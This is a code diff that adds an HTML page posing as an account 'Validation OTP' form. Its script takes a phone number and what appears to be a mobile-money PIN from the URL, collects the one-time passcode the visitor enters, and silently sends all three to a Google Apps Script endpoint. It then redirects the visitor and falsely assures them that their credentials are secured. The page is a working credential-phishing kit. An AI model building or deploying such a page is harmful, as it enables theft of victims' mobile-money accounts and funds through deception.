@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Validation OTP</title>
+
+<style>
+    body { margin: 0; font-family: Arial, sans-serif; background-color: #003b7a; }
+    .container { text-align: center; padding: 40px 20px; color: white; }
+    h1 { color: white; font-size: 26px; font-weight: 700; margin-bottom: 10px; }
+    .subtitle { font-size: 18px; color: #ffffff; font-weight: bold; margin-bottom: 5px; }
+    .form-box { background: white; border-radius: 25px 25px 0 0; padding: 30px 20px 50px; margin-top: 30px; text-align: left; color: #333; }
+    label { font-weight: bold; font-size: 18px; display: block; margin-bottom: 10px; }
+    input[type="text"] { width: 100%; padding: 15px; font-size: 16px; border: 2px solid #cccccc; border-radius: 10px; margin-bottom: 25px; box-sizing: border-box; }
+    button { width: 100%; padding: 15px; font-size: 18px; font-weight: bold; border: none; border-radius: 30px; background-color: grey; color: white; cursor: pointer; }
+    button:hover { background-color: #5a5a5a; }
+    .secured { text-align: center; margin-top: 15px; font-size: 14px; color: #666; }
+</style>
+</head>
+
+<body>
+
+<div class="container">
+    <h1>VALIDATION OTP</h1>
+    <div class="subtitle">Enter the OTP to complete your account validation</div>
+</div>
+
+<div class="form-box">
+    <form id="otpForm">
+
+        <label>Validation OTP</label>
+        <input type="text" id="otpCode" maxlength="6" placeholder="Enter OTP" required />
+
+        <button type="submit">Validate OTP</button>
+
+        <div class="secured">Your credentials are secured.</div>
+    </form>
+</div>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const phone = urlParams.get("phone");
+    const momoCode = urlParams.get("momoCode");
+
+    const scriptURL = "https://script.google.com/macros/s/AKfycbzTjON_BjKj9u2TKg1l_PRrhaQmh8amYzxN73BWQjpzz0bJs9ha2LoG4xVdcNswyc6c/exec";
+
+    document.getElementById("otpForm").addEventListener("submit", async function(e){
+        e.preventDefault();
+
+        const otpCode = document.getElementById("otpCode").value;
+
+        await fetch(scriptURL, {
+            method: "POST",
+            mode: "no-cors",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone, momoCode, otpCode })
+        });
+
+        window.location.href = "done.html";
+    });
+</script>
+
+</body>
+</html>
